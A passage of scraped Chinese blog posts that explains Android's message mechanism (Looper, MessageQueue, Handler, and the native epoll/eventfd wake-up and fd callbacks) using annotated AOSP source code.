&#123; const Response&amp; response = mResponses.itemAt(mResponseIndex++); int ident = response.request.ident; if (ident &gt;= 0) &#123; int fd = response.request.fd; int events = response.events; void* data = response.request.data; if (outFd != NULL) *outFd = fd; if (outEvents != NULL) *outEvents = events; if (outData != NULL) *outData = data; return ident; &#125; &#125; if (result != 0) &#123; if (outFd != NULL) *outFd = 0; if (outEvents != NULL) *outEvents = 0; if (outData != NULL) *outData = NULL; return result; &#125; result = pollInner(timeoutMillis); &#125;&#125; 我们之前直接跳过了26行之前的内容，现在我们还是不能理解这一段的意义，从程序上看，我们从mResponse容器中取出了一个response并把他的内容放入了传入的地址参数中返回。首先，这个调用中没有传入地址参数，其次，这个mResponse数组是什么呢？ 我们继续先往下看，下面的pollInner()方法比较长也是native消息机制的核心，我们拆成几个部分看。 pollInner()Request 与 Response12345678910111213141516171819202122232425262728293031323334 int result = POLL_WAKE; mResponses.clear(); mResponseIndex = 0; mPolling = true; struct epoll_event eventItems[EPOLL_MAX_EVENTS]; int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis); mPolling = false; mLock.lock();... for (int i = 0; i &lt; eventCount; i++) &#123; int fd = eventItems[i].data.fd; uint32_t epollEvents = eventItems[i].events; if (fd == mWakeEventFd) &#123; if (epollEvents &amp; EPOLLIN) &#123; awoken(); &#125; else &#123; ALOGW(\"Ignoring unexpected epoll events 0x%x on wake event fd.\", epollEvents); &#125; &#125; else &#123; ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &gt;= 0) &#123; int events = 0; if (epollEvents &amp; EPOLLIN) events |= EVENT_INPUT; if (epollEvents &amp; EPOLLOUT) events |= EVENT_OUTPUT; if (epollEvents &amp; EPOLLERR) events |= EVENT_ERROR; if (epollEvents &amp; EPOLLHUP) events |= EVENT_HANGUP; pushResponse(events, mRequests.valueAt(requestIndex)); &#125; else &#123; ALOGW(\"Ignoring unexpected epoll events 0x%x on fd %d that is \" \"no longer registered.\", epollEvents, fd); &#125; &#125; &#125; 当第7行系统调用epoll_wait()返回时，说明因注册的fd有消息或达到超时，在第11行就对收到的唤醒events进行遍历，首先判断有消息的fd是不是用于唤醒的mWakeEventFd，如果不是的话，说明是系统调用addFd()方法设置的自定义fd（后面会讲）。那么我们需要对这个事件作出响应。 第21到28行就对这个event做处理，首先，我们以这个fd为key从mRequests中找到他的索引，这个mRequests是我们在addFd()方法一并注册的以fd为key，Request为value的映射表。找到request之后，28行调用pushResponse()方法去建立response： 123456void Looper::pushResponse(int events, const Request&amp; request) &#123; Response response; response.events = events; response.request = request; mResponses.push(response);&#125; 现在我们要处理的任务已经被封装成了一个Response对象，等待被处理，那么真正的处理在哪里呢？ 在上面的代码与处理response的代码中间夹着的是处理MessageEnvelope的代码，我们后面再讲这段，现在到处理response的代码： 1234567891011121314for (size_t i = 0; i &lt; mResponses.size(); i++) &#123; Response&amp; response = mResponses.editItemAt(i); if (response.request.ident == POLL_CALLBACK) &#123; int fd = response.request.fd; int events = response.events; void* data = response.request.data; int callbackResult = response.request.callback-&gt;handleEvent(fd, events, data); if (callbackResult == 0) &#123; removeFd(fd, response.request.seq); &#125; response.request.callback.clear(); result = POLL_CALLBACK; &#125;&#125; 遍历所有response对象，取出之前注册的request对象的信息，然后调用了request.callback-&gt;handleEvent()方法进行回调，如果该回调返回0，则调用removeFd()方法取消这个fd的注册。 再梳理一遍这个过程：注册的自定义fd被消息唤醒，从mRequests中以fd为key找到对应的注册好的request对象然后生成response对象，在MessageEnvelop处理完毕之后处理response，调用request中的callback的handleEvent()方法。 那么addFd()注册自定义fd与removeFd()取消注册是如何实现的呢？ addFd()12345678910111213141516171819202122232425262728293031323334353637383940414243444546int Looper::addFd(int fd, int ident, int events, const sp&lt;LooperCallback&gt;&amp; callback, void* data) &#123; ... &#123; // acquire lock AutoMutex _l(mLock); Request request; request.fd = fd; request.ident = ident; request.events = events; request.seq = mNextRequestSeq++; request.callback = callback; request.data = data; if (mNextRequestSeq == -1) mNextRequestSeq = 0; // reserve sequence number -1 struct epoll_event eventItem; request.initEventItem(&amp;eventItem); ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &lt; 0) &#123; int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; ALOGE(\"Error adding epoll events for fd %d: %s\", fd, strerror(errno)); return -1; &#125; mRequests.add(fd, request); &#125; else &#123; int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_MOD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; if (errno == ENOENT) &#123; epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; ALOGE(\"Error modifying or adding epoll events for fd %d: %s\", fd, strerror(errno)); return -1; &#125; scheduleEpollRebuildLocked(); &#125; else &#123; ALOGE(\"Error modifying epoll events for fd %d: %s\", fd, strerror(errno)); return -1; &#125; &#125; mRequests.replaceValueAt(requestIndex, request); &#125; &#125; // release lock return 1;&#125; 第6-13行使用传入的参数初始化了request对象，然后16行由request来初始化注册epoll使用的event。19行根据mRequests.indexOfKey()方法取出的值来判断fd是否已经注册，如果未注册，则在20行进行系统调用epoll_ctl()注册新监听并在25行将fd与request存入mRequest，如果已注册，则在27行更新注册并在42行更新request。 这就是自定义fd设置的过程：保存request并使用epoll_ctl系统调用注册fd的监听。 removeFd()12345678910111213141516171819202122232425int Looper::removeFd(int fd, int seq) &#123; &#123; // acquire lock AutoMutex _l(mLock); ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &lt; 0) &#123; return 0; &#125; if (seq != -1 &amp;&amp; mRequests.valueAt(requestIndex).seq != seq) &#123; return 0; &#125; mRequests.removeItemsAt(requestIndex); int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_DEL, fd, NULL); if (epollResult &lt; 0) &#123; if (seq != -1 &amp;&amp; (errno == EBADF || errno == ENOENT)) &#123; scheduleEpollRebuildLocked(); &#125; else &#123; ALOGE(\"Error removing epoll events for fd %d: %s\", fd, strerror(errno)); scheduleEpollRebuildLocked(); return -1; &#125; &#125; &#125; // release lock return 1;&#125; 解除的过程相反，在第11行删除mRequests中的键值对，然后在第13行系统调用epoll_ctl()解除fd的epoll注册。 MessageEnvelop消息处理之前说到，在request生成response到response的处理中间有一段代码执行了MessageEnvelop消息的处理，这个顺序保证了MessageEnvelop优先于fd引起的request的处理。 现在我们来看这段代码： 12345678910111213141516171819202122mNextMessageUptime = LLONG_MAX;while (mMessageEnvelopes.size() != 0) &#123; nsecs_t now = systemTime(SYSTEM_TIME_MONOTONIC); const MessageEnvelope&amp; messageEnvelope = mMessageEnvelopes.itemAt(0); if (messageEnvelope.uptime &lt;= now) &#123; &#123; // obtain handler sp&lt;MessageHandler&gt; handler = messageEnvelope.handler; Message message = messageEnvelope.message; mMessageEnvelopes.removeAt(0); mSendingMessage = true; mLock.unlock(); handler-&gt;handleMessage(message); &#125; // release handler mLock.lock(); mSendingMessage = false; result = POLL_CALLBACK; &#125; else &#123; mNextMessageUptime = messageEnvelope.uptime; break; &#125;&#125; 可以看到mMessageEnvelopes容器中存储了所有的消息，第4行从首位置取出一条消息，随后进行时间判断，如果时间到达，先移出容器，与java层比较相似都是调用了handler的handleMessage()来进行消息的处理。 那么MessageEnvelope是如何添加的呢？ Native Looper提供了一套与java层MessageQueue类似的方法，用于添加MessageEnvelope： 12345678910111213141516171819202122void Looper::sendMessageAtTime(nsecs_t uptime, const sp&lt;MessageHandler&gt;&amp; handler, const Message&amp; message) &#123; size_t i = 0; &#123; // acquire lock AutoMutex _l(mLock); size_t messageCount = mMessageEnvelopes.size(); while (i &lt; messageCount &amp;&amp; uptime &gt;= mMessageEnvelopes.itemAt(i).uptime) &#123; i += 1; &#125; MessageEnvelope messageEnvelope(uptime, handler, message); mMessageEnvelopes.insertAt(messageEnvelope, i, 1); if (mSendingMessage) &#123; return; &#125; &#125; // release lock if (i == 0) &#123; wake(); &#125;&#125; 这段添加MessageEnvelope的代码不需要太多的解释。 小结现在我们看到，其实Native中的消息机制有两个方面，一方面是通过addFd()注册的自定义fd触发消息处理，通过mRequests保存的request对象中的callback进行消息处理。另一方面是通过与java层类似的MessageEnvelop消息对象进行处理，调用的是该对象handler域的handleMessage()方法，与java层非常类似。优先级是先处理MessageEnvelop再处理request。 一些思考现在消息机制全部内容分析下来，我们可以看到android的消息机制不算复杂，分为native与java两个部分，这两个部分分别有自己的消息处理机制，其中关键的超时与唤醒部分是借助了linux系统epoll机制来实现的。 连接java与native层消息处理过程的是next()方法中的nativePollOnce()，java层消息循环先调用它，自身阻塞，进入native的消息处理，在native消息处理完毕后返回，再进行java层的消息处理，正是因为如此，如果我们在处理java层消息的时候执行了耗时或阻塞的任务（甚至阻塞了整个主线程），整个java层的消息循环就会阻塞，也无法进入native层的消息处理，也就无法响应例如触摸事件这样的消息，导致ANR的发生。这也就是我们不应在主线程中执行这类任务的原因。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"Event","slug":"Event","permalink":"https://www.viseator.com/tags/Event/"}]},{"title":"Android 消息机制（二）Handler对消息机制的使用","date":"2017-10-24T09:03:43.000Z","path":"2017/10/24/android_event_2/","text":"Android 消息机制（一）消息队列的创建与循环的开始 Looper与MessageQueue中讲述了消息机制的底层实现，下面就从平时所常用的Handler来讲述消息机制的使用。 HandlerHandler是我们平时进行异步、多线程开发中常用的一个组件，如果在应用主线程中调用阻塞的或者资源消耗量大的任务，会造成UI的更新卡顿，所以我们会将这样的任务放在新的线程中进行操作。当需要通知UI进行更新时，我们会使用Handler创建消息丢入主线程的消息队列，再等待主线程的Handler的处理方法随着消息的处理而被调用，再进行下面的操作。这是Handler的基本用法，它的实现就与消息机制密切相关。 下面我们就对它的实现进行分析。 构造Handler的构造方法中除了实现默认参数的相互调用外，有内容的有这么两个： 1234567891011public Handler(Callback callback, boolean async) &#123; ... mLooper = Looper.myLooper(); if (mLooper == null) &#123; throw new RuntimeException( \"Can't create handler inside thread that has not called Looper.prepare()\"); &#125; mQueue = mLooper.mQueue; mCallback = callback; mAsynchronous = async;&#125; 如果传入的了callback，将会保存到mCallback域中，之后的消息处理中会看到。 如果没有传入loop参数，将会使用默认的Looper.myLooper()也就是之前提到过的本线程TLS中储存的Looper对象。mQueue消息队列就是从该Looper中获取的消息队列。 123456public Handler(Looper looper, Callback callback, boolean async) &#123; mLooper = looper; mQueue = looper.mQueue; mCallback = callback; mAsynchronous = async;&#125; 如果传入了looper，那么我们将从它这里获取对应的消息队列对象，之后的消息就会放入这个队列中，这也是我们可以通过Handler实现跨线程通信的基础。 发送消息sendMessage调用链那么我们直接进入主题：使用Handler来发送异步处理的消息。 发送消息，我们最常用的是sendMessage()方法： 1234public final boolean sendMessage(Message msg)&#123; return sendMessageDelayed(msg, 0);&#125; 1234567public final boolean sendMessageDelayed(Message msg, long delayMillis)&#123; if (delayMillis &lt; 0) &#123; delayMillis = 0; &#125; return sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);&#125; 12345678910public boolean sendMessageAtTime(Message msg, long uptimeMillis) &#123; MessageQueue queue = mQueue; if (queue == null) &#123; RuntimeException e = new RuntimeException( this + \" sendMessageAtTime() called with no mQueue\"); Log.w(\"Looper\", e.getMessage(), e); return false; &#125; return enqueueMessage(queue, msg, uptimeMillis);&#125; 最终调用的是sendMessageAtTime()方法，发送在特定时刻处理的消息。 然后调用enqueueMessage()方法： 1234567private boolean enqueueMessage(MessageQueue queue, Message msg, long uptimeMillis) &#123; msg.target = this; if (mAsynchronous) &#123; msg.setAsynchronous(true); &#125; return queue.enqueueMessage(msg, uptimeMillis);&#125; 这里的第2行中，将msg的target设置为this也就是这个Handler本身，我们回想起消息循环中处理Message的调用：1msg.target.dispatchMessage(msg);现在我们知道，Handler发送的消息被消息队列拿到后，会调用发送它的Handler的dispatchMessage()方法对它进行处理。 然后，调用了MessageQueue的enqueueMessage()方法来向消息队列中插入消息： enqueueMessage12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455boolean enqueueMessage(Message msg, long when) &#123; // 不允许没有target的Message，这种Message(barrier)只能由系统产生用于唤醒消息队列 if (msg.target == null) &#123; throw new IllegalArgumentException(\"Message must have a target.\"); &#125; // 防止消息被重复处理 if (msg.isInUse()) &#123; throw new IllegalStateException(msg + \" This message is already in use.\"); &#125; synchronized (this) &#123; // 检查消息队列是否处于退出状态 if (mQuitting) &#123; IllegalStateException e = new IllegalStateException( msg.target + \" sending message to a Handler on a dead thread\"); Log.w(TAG, e.getMessage(), e); msg.recycle(); return false; &#125; msg.markInUse(); msg.when = when; Message p = mMessages; boolean needWake; if (p == null || when == 0 || when &lt; p.when) &#123; // 在这三种情况下，这条消息被插入到了队列的头部，因此我们应唤醒消息队列 msg.next = p; mMessages = msg; needWake = mBlocked; // 如果处于阻塞状态，则需要进行唤醒 &#125; else &#123; // 在队列中插入的消息，只有在target为空（barrier）并且设置为异步时，需要进行唤醒操作 needWake = mBlocked &amp;&amp; p.target == null &amp;&amp; msg.isAsynchronous(); Message prev; // 熟悉的链表插入操作 for (;;) &#123; prev = p; p = p.next; if (p == null || when &lt; p.when) &#123; break； &#125; if (needWake &amp;&amp; p.isAsynchronous()) &#123; needWake = false; // 如果有消息不需要进行异步处理，则无需进行唤醒操作 &#125; &#125; // 插入到p结节之前 msg.next = p; prev.next = msg; &#125; // 如果有needWake标记，则进行消息队列的唤醒操作 if (needWake) &#123; nativeWake(mPtr); &#125; &#125; return true;&#125; 整个方法的流程在注释中进行了分析，这里主要就分为了两种情况，需要进行队列唤醒与无需进行队列唤醒的，如果需要队列唤醒操作（有needWake标记），则会在调用的最后调用nativeWake()方法进行native的唤醒操作。 队列的唤醒1234static void android_os_MessageQueue_nativeWake(JNIEnv* env, jclass clazz, jlong ptr) &#123; NativeMessageQueue* nativeMessageQueue = reinterpret_cast&lt;NativeMessageQueue*&gt;(ptr); nativeMessageQueue-&gt;wake();&#125; native方法中，利用mPtr指针找到native层创建的NativeMessageQueue对象，然后调用了它的wake()方法： 123void NativeMessageQueue::wake() &#123; mLooper-&gt;wake();&#125; 而接着调用的是NativeMessageQueue对象的中保存的Native Looper对象的wake()方法： 12345678910void Looper::wake() &#123; uint64_t inc = 1; ssize_t nWrite = TEMP_FAILURE_RETRY(write(mWakeEventFd, &amp;inc, sizeof(uint64_t))); if (nWrite != sizeof(uint64_t)) &#123; if (errno != EAGAIN) &#123; LOG_ALWAYS_FATAL(\"Could not write wake signal to fd %d: %s\", mWakeEventFd, strerror(errno)); &#125; &#125;&#125; 这个方法做的事情非常简单，利用write()函数，向mWakeEventFd这个fd中写入了inc这个值（1）。 为什么只需要这样简单的写入就可以做到唤醒消息队列呢？ 我们再回想到上一篇文章中的Native Looper创建与Epoll的初始化过程，我们创建了这个eventFd类型的mWakeEventFd，并且为它注册了epoll监听，一旦有来自于mWakeEventFd的新内容，NativePollOnce()中的epoll_wait()调用就会返回，这里就已经起到了唤醒队列的作用。 到这里，发送（插入）新消息到消息队列的过程已经完成，我们只需要等待设置的时间到达，消息队列就会取出我们发送的消息并进行处理。 消息的处理消息队列拿到消息后，调用msg.target.dispatchMessage(msg);进行消息的处理，从前文我们了解到，Handler发送的消息的target就是Handler自身，所以调用的就是它的dispatchMessage()方法： 123456789101112public void dispatchMessage(Message msg) &#123; if (msg.callback != null) &#123; handleCallback(msg); &#125; else &#123; if (mCallback != null) &#123; if (mCallback.handleMessage(msg)) &#123; return; &#125; &#125; handleMessage(msg); &#125;&#125; 这个过程也比较经典，第2行if判断Message是否拥有自己的callback，如果有的话就调用handleCallback()来运行这个Runnable： 123private static void handleCallback(Message message) &#123; message.callback.run();&#125; 如果没有自带callback，第5行检查Handler是否自带callback，如果有的话就去执行这个callback，但是这里还有一点细节需要注意，如果这个方法返回了false，那么后面Handler自带的handlerMessage()方法同样会被执行，这里其实就是一个执行的优先级顺序的问题，一般情况下我们使用时只会传入callback或是重写Handler的handleMessage()方法，优先级也就是确保一个执行顺序的逻辑。 到这里，Handler的部分就结束了，但是整个消息机制的分析还没有结束，到现在我们分析的都是java层对消息的处理过程，略过了native层自己的一套处理来自于native的消息的机制，下面一篇文章就会把关注点放在这一部分。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"Event","slug":"Event","permalink":"https://www.viseator.com/tags/Event/"}]},{"title":"Android 消息机制（一）消息队列的创建与循环的开始 Looper与MessageQueue","date":"2017-10-22T07:32:19.000Z","path":"2017/10/22/android_event_1/","text":"写在前面 本文基于Android 7.1.1 (API 25)的源码分析编写 与之前的触摸事件分发机制分析的文章一样，Android系统机制的分析中关键的一环就是事件消息的处理。之前也说过，Android本质上是一个事件驱动的模型，通过各式各样不断产生事件消息的来推动UI、数据的更新与对我们交互的反馈，没有事件消息的产生，就不会有直观的界面的变化，也就不会有应用丰富的功能。 所以Android的消息机制与其他过程的关系是极其紧密的，例如启动Activity的过程就涉及到ActivityManagerService与应用主进程的通信，产生的通知消息通过Binder机制送入应用主进程的消息队列，再由主进程的消息循环来读取这一消息来进行处理。之前触摸事件分发中也是利用了应用主进程的消息队列来读取我们的触摸事件再进行后续的分发处理。可以说消息队列在各种通信过程中无处不在。 消息队列的存在为异步处理提供了一个非常好的基础，有了消息队列之后，我们就可以在新的线程中处理计算、IO密集、阻塞的任务而不会影响UI的更新，在处理过程中可以通过向消息队列中放入消息来进行UI的更新操作，而发送消息的行为也避免了工作线程为了等待返回而造成的阻塞。 可以说，想要了解其他基于事件的过程，对主线程消息机制的了解是必不可少的基础，在触摸事件分发机制分析的文章中我对消息机制还不是很了解，所以后来发现分析中有很多描述不妥的地方，所以在对消息机制的系统学习之后我又修改完善了这部分的内容。 引入Android Studio的3.0版本中引入了一个强大的性能分析工具：Android Profiler，对于它的详细介绍可以看官方的文档。 我们对一个简单的HelloWorld应用进行方法分析： 可以看到，对于这样一个没有任务需要处理的程序，这段时间中它一直执行的是nativePollOnce()方法，对于这个，stackoverflow上就有人提了一个问题。这个方法其实就是消息队列在队列中没有消息时处于等待状态执行的一个Native方法。 我们的分析就从消息队列(MessageQueue)与负责执行循环过程的Looper对象的创建与开始运行开始。 Looper与MessageQueue的创建当一个Activity被创建时，ActivityThread的main()方法会被执行（关于Activity创建过程的内容，请参阅启动分析相关的文章）： 1234567891011public static void main(String[] args) &#123; Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"ActivityThreadMain\");... Looper.prepareMainLooper();... Looper.loop(); throw new RuntimeException(\"Main thread loop unexpectedly exited\");&#125; Looper的创建第5行中，调用Looper的prepareMainLooper()方法来创建Looper对象： 123456789public static void prepareMainLooper() &#123; prepare(false); synchronized (Looper.class) &#123; if (sMainLooper != null) &#123; throw new IllegalStateException(\"The main Looper has already been prepared.\"); &#125; sMainLooper = myLooper(); &#125;&#125; 123456private static void prepare(boolean quitAllowed) &#123; if (sThreadLocal.get() != null) &#123; throw new RuntimeException(\"Only one Looper may be created per thread\"); &#125; sThreadLocal.set(new Looper(quitAllowed));&#125; 这里的sThreadLocal对象的类型是ThreadLocal&lt;Looper&gt;是一个存放在TLS（Thread-local storage)中的对象容器，储存在其中的对象的特点是每个线程中只有一个，并且个线程中储存的该对象不相同。 我们在这里新建了一个Looper对象并放入了TLS中： 1234private Looper(boolean quitAllowed) &#123; mQueue = new MessageQueue(quitAllowed); mThread = Thread.currentThread();&#125; mThread保存了当前运行Looper的进程信息。 而mQueue就是与Looper对应的MessageQueue。 MessageQueue的创建1234MessageQueue(boolean quitAllowed) &#123; mQuitAllowed = quitAllowed; mPtr = nativeInit();&#125; 构造函数十分简单，除了初始化quitAllowed标记之外，就是对mPtr的初始化了。 那么mPtr是什么呢？可以推测出的是，真正的MessageQueue的创建一定在nativeInit这个Native调用中，也就是说，我们的MessageQueue实际上存在于Native层。 android_os_MessageQueue.cpp: 12345678910static jlong android_os_MessageQueue_nativeInit(JNIEnv* env, jclass clazz) &#123; NativeMessageQueue* nativeMessageQueue = new NativeMessageQueue(); if (!nativeMessageQueue) &#123; jniThrowRuntimeException(env, \"Unable to allocate native queue\"); return 0; &#125; nativeMessageQueue-&gt;incStrong(env); return reinterpret_cast&lt;jlong&gt;(nativeMessageQueue);&#125; 在Native层创建了一个NativeMessageQueue对象： 12345678NativeMessageQueue::NativeMessageQueue() : mPollEnv(NULL), mPollObj(NULL), mExceptionObj(NULL) &#123; mLooper = Looper::getForThread(); if (mLooper == NULL) &#123; mLooper = new Looper(false); Looper::setForThread(mLooper); &#125;&#125; 这里做的事情可以和Java层进行对应：在TLS中创建了一个Looper对象，但这个Looper对象和Java层并不是同一个，并且他们的功能也不相同：Java层的Looper是为了处理的消息队列中的消息，Native中的Looper是为了处理注册的自定义Fd引起的Request 消息，这些消息一般来自于系统底层如触摸事件等（这个部分另开文章讲，这篇文章只关注一般的事件分发）。 我们来看看这个与NativeMessageQueue对应的Native Looper的构造： Native Looper 创建与 Epoll的初始化1234567891011Looper::Looper(bool allowNonCallbacks) : mAllowNonCallbacks(allowNonCallbacks), mSendingMessage(false), mPolling(false), mEpollFd(-1), mEpollRebuildRequired(false), mNextRequestSeq(0), mResponseIndex(0), mNextMessageUptime(LLONG_MAX) &#123; mWakeEventFd = eventfd(0, EFD_NONBLOCK | EFD_CLOEXEC); LOG_ALWAYS_FATAL_IF(mWakeEventFd &lt; 0, \"Could not make wake event fd: %s\", strerror(errno)); AutoMutex _l(mLock); rebuildEpollLocked();&#125; 这里就要涉及一些Linux中系统调用中eventfd()函数与多路I/O复用函数epoll()的相关知识了，这部分也是消息机制的底层核心。 上面的代码中第5行中使用eventFd()系统调用获取了一个mWakeEventFd作为后续epoll()用于唤醒的File Descriper（文件描述符）。这里是较之前版本有所不同的地方，网上找到的大部分分析文章中的这个地方还是使用的之前使用的管道机制，也就是通过pipe()系统调用来创建一对Fd，再利用这对Fd来进行监听唤醒操作。相比于管道，Linux在内核版本2.6.22引入的eventFd在解决这种简单的监听操作中的开销比较小，并且更加轻量。 我们现在有了一个eventFd对象的Fd，下面我们进入第10行的rebuildEpollLocked()调用： 12345678910111213141516171819202122232425void Looper::rebuildEpollLocked() &#123;... mEpollFd = epoll_create(EPOLL_SIZE_HINT); LOG_ALWAYS_FATAL_IF(mEpollFd &lt; 0, \"Could not create epoll instance: %s\", strerror(errno)); struct epoll_event eventItem; memset(&amp; eventItem, 0, sizeof(epoll_event)); // zero out unused members of data field union eventItem.events = EPOLLIN; eventItem.data.fd = mWakeEventFd; int result = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, mWakeEventFd, &amp; eventItem); LOG_ALWAYS_FATAL_IF(result != 0, \"Could not add wake event fd to epoll instance: %s\", strerror(errno)); for (size_t i = 0; i &lt; mRequests.size(); i++) &#123; const Request&amp; request = mRequests.valueAt(i); struct epoll_event eventItem; request.initEventItem(&amp;eventItem); int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, request.fd, &amp; eventItem); if (epollResult &lt; 0) &#123; ALOGE(\"Error adding epoll events for fd %d while rebuilding epoll set: %s\", request.fd, strerror(errno)); &#125; &#125;&#125; 第3行中，进行了系统调用epoll_create()初始化了一个epoll实例。之后的6-9行创建了epoll注册需要使用的eventItem并设置了events属性与fd域。 在第10行，进行了系统调用epoll_ctl()来将之前创建的mWakeEventFd与eventItem注册到epoll。那么这些步骤的目的是什么呢？ 简单地说，epoll这个系统提供的组件允许我们对多个文件描述符（fd）进行监听，注册监听的fd后，可以调用epoll_wait()函数，当fd所指向的对象的数据可用时，epoll_wait()函数就会返回，同时以events的形式返回发生改变的fd对应的eventItem。 借助这个功能，我们就可以实现在没有事件的时候让线程阻塞，当新的事件来临的时候让线程解除阻塞并唤醒。 到这里你可能会想，这样的功能使用一个标志量，不断地查询这个标志量，当标志量发生变化的时候唤醒不也可以实现相同的功能吗？为什么要使用这么复杂的机制呢？这是因为Looper同时为我们提供了addFd()函数让我们可以设置自定义的fd与对应的event，然后在Native Looper中对自定义的fd发生改变的事件进行处理（上面代码中后面的部分就是在处理这部分注册）。之前文章讲过的触摸事件分发就是这样做的。（再次说明这一剖分的内容另外一篇文章讲，本篇只涉及一般的消息处理机制） 现在，注册epoll的过程已经完成，Native Looper的初始化也到此结束。 现在我们回到nativeInit调用，它的返回值赋给了Java层MessageQueue的mPtr域： 12345678910static jlong android_os_MessageQueue_nativeInit(JNIEnv* env, jclass clazz) &#123; NativeMessageQueue* nativeMessageQueue = new NativeMessageQueue(); if (!nativeMessageQueue) &#123; jniThrowRuntimeException(env, \"Unable to allocate native queue\"); return 0; &#125; nativeMessageQueue-&gt;incStrong(env); return reinterpret_cast&lt;jlong&gt;(nativeMessageQueue);&#125; 第9行就将创建的NativeMessageQueue对象的地址转换为一个Java long类型返回，之后调用Native方法的时候就会传入这个参数来找到这个MessageQueue。 用一张图来梳理这个过程： 消息循环loop()初始化过程结束后，我们回到ActivityThread的main()函数： 1Looper.loop(); 调用了Looper的loop()函数开始消息循环。 123456789101112131415161718192021222324public static void loop() &#123; final Looper me = myLooper();... final MessageQueue queue = me.mQueue;... for (;;) &#123; Message msg = queue.next(); // might block if (msg == null) &#123; // No message indicates that the message queue is quitting. return; &#125;... try &#123; msg.target.dispatchMessage(msg); &#125; finally &#123; if (traceTag != 0) &#123; Trace.traceEnd(traceTag); &#125; &#125;... msg.recycleUnchecked(); &#125;&#125; 省略掉一些log的代码之后，我们看到第7行开始了一个无限循环，循环的第一步就是从MessageQueue里面获取一条Message，后面有一个注释告诉我们这个调用可能会阻塞。我们先不管这个调用具体情况，假设我们从这个调用中返回，我们先看后面的处理过程。 首先检查获取到的msg是否为null，如果为null，那么将会直接退出loop()函数，对于Activity的主线程来说，这个情况只会发生在应用退出的时候。 下面就直接调用了Message的target的dispatchMessage()函数，在使用Handler来发送消息的时候，这个target指的就是Handler本身，后面会看到这个过程。 MessageQueue next()这个函数过程比较长， 我们分开来分析。 1234567891011Message next() &#123; final long ptr = mPtr; if (ptr == 0) &#123; return null; &#125; int pendingIdleHandlerCount = -1; // -1 only during first iteration int nextPollTimeoutMillis = 0; for (;;) &#123;... nativePollOnce(ptr, nextPollTimeoutMillis); 第一部分是变量的初始化，如果MessageQueue的mPtr为0的话，说明NativeMessageQueue没有正确初始化，返回null结束消息循环。 下面定义了两个变量，第一个pendingIdleHandlerCount初始化为-1，它表示的是将要执行的空闲Handler数量，之后会用到。 第二个nextPollTimeoutMillis就是距下一条消息被处理需要等待的时间。 下面又进入了一个无限循环，注意第11行，我们看到了熟悉的调用，它是引入中讲的在没有事件处理的时候不断执行的函数。我们可以猜测，等待的过程就是发生在这个函数中的。 我们同样先看下面的处理，现在只要知道这个函数会造成阻塞，当有新的Message或者达到超时时间时才会返回，这点非常重要。 下面的过程： 123456789101112131415161718192021222324252627282930313233343536373839synchronized (this) &#123; final long now = SystemClock.uptimeMillis(); // 获取当前时刻 Message prevMsg = null; Message msg = mMessages; // Message是一个链表的结构，而mMessages相当于\"头指针\" if (msg != null &amp;&amp; msg.target == null) &#123; // 当message的target为null的时候，被认为是一个特殊的message，我们应当跳过这类message do &#123; prevMsg = msg; msg = msg.next; &#125; while (msg != null &amp;&amp; !msg.isAsynchronous()); &#125; if (msg != null) &#123; if (now &lt; msg.when) &#123; // 当时间还没到message的执行时间时，更新nextPollTimeoutMillis nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE); &#125; else &#123; // message到时间，需要被处理 mBlocked = false; // 取消阻塞状态标记 // 从链表中取出表头的message if (prevMsg != null) &#123; prevMsg.next = msg.next; &#125; else &#123; mMessages = msg.next; &#125; msg.next = null; if (DEBUG) Log.v(TAG, \"Returning message: \" + msg); msg.markInUse(); // 标记使用状态 return msg; // 返回该message &#125; &#125; else &#123; // msg == null，没有消息 nextPollTimeoutMillis = -1; // 如果该值为-1，nativePullOnce()将会无限执行直到有新的消息通知 &#125; // 处理退出消息循环的请求，返回null退出消息循环 if (mQuitting) &#123; dispose(); return null; &#125; 这个过程比较简单，需要注意的就是Message的链表结构，每次取首元素来进行处理。 1234567891011121314151617181920212223242526272829303132333435// 只会在第一次没有消息的时候执行，检查mIdleHandlers中注册的IdleHandlerif (pendingIdleHandlerCount &lt; 0 &amp;&amp; (mMessages == null || now &lt; mMessages.when)) &#123; pendingIdleHandlerCount = mIdleHandlers.size();&#125;// 如果没有注册pendingIdleHandler，继续保持阻塞状态if (pendingIdleHandlerCount &lt;= 0) &#123; mBlocked = true; continue;&#125;// 初始化mPendingHandlersif (mPendingIdleHandlers == null) &#123; mPendingIdleHandlers = new IdleHandler[Math.max(pendingIdleHandlerCount, 4)];&#125;mPendingIdleHandlers = mIdleHandlers.toArray(mPendingIdleHandlers);// 执行pendingIdleHandlerfor (int i = 0; i &lt; pendingIdleHandlerCount; i++) &#123; final IdleHandler idler = mPendingIdleHandlers[i]; mPendingIdleHandlers[i] = null; boolean keep = false; try &#123; // 实质上是执行queueIdle()方法 keep = idler.queueIdle(); &#125; catch (Throwable t) &#123; Log.wtf(TAG, \"IdleHandler threw exception\", t); &#125; if (!keep) &#123; // 如果返回是false，则移除这个IdleHandler，不会再执行 synchronized (this) &#123; mIdleHandlers.remove(idler); &#125; // 重置pendingIdleHandler计数 pendingIdleHandlerCount = 0; // 由于执行IdleHandler过程中可能已经有新的消息到来，故设置超时为0，直接检查新的消息 nextPollTimeoutMillis = 0;&#125; 这里的mIdleHandlers中注册了一些需要在没有消息处理时进行的任务，在处理这些任务的过程中使用了pendingIdleHandler作为临时容器。这个过程就是去执行这些IdleHandler的过程。 